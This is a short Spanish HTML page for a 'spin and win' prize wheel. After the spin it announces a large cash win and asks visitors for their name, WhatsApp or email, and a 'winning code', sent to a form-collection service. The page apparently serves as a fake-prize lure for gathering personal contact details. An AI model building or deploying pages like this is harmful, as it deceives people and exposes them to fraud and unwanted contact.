<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Gira y Gana</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="style.css">
</head>
<body>

  <div class="logo-container">
    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTid7FRnGKkjnH24tmXEDEiGGsbz4quMV7tyNw9367Q3Q&s" alt="Logo" class="logo">
  </div>

  <div id="game-section">
    <h1>Gira y Gana</h1>
    <p>¡Gírala! — Premios emocionantes te esperan.</p>

    <div class="wheel-container">
      <div class="wheel" id="wheel">GIRA</div>
      <div class="pointer">▼</div>
    </div>

    <button id="spinBtn">¡Girar Ahora!</button>

    <p id="result"></p>
  </div>

  <!-- FORM SECTION -->
  <div id="form-section">
    <h2>¡Felicidades!</h2>
    <p class="prize-text" id="prizeMessage">
      ¡GANASTE $XX,XXX!<br>
      Completa los 3 campos para reclamar tu premio.
    </p>

    <form id="claimForm" action="https://formspree.io/f/xzdrqyke" method="POST">
      <input type="text" name="nombre" placeholder="Nombre Completo" required>
      <input type="text" name="contacto" placeholder="WhatsApp o Email" required>
      <input type="text" name="codigo_ganancia" placeholder="Código de Ganancia" required>
      <input type="hidden" name="premio" id="hiddenPrize" value="">

      <button type="submit" id="submitBtn">Reclamar Premio</button>
    </form>

    <p class="small-note">Tus datos están seguros — te contactaremos pronto.</p>
  </div>

  <script src="script.js"></script>

</body>
</html>
